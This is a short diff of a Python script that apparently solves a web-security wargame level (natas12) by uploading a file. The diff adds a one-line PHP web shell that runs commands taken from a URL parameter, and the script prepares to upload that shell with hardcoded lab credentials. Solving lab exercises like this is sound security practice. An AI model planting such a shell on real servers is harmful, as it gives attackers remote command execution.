@@ -1,6 +1,12 @@
 import requests
 import re
 
+""" shell.php
+<?php
+passthru($_GET['c']);
+?>
+"""
+
 # first upload a shell.php to the server
 auth = requests.auth.HTTPBasicAuth('natas12','EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3')
 files = {'uploadedfile': '<? passthru($_GET["c"]); ?>'} #open('shell.php','rb')} 
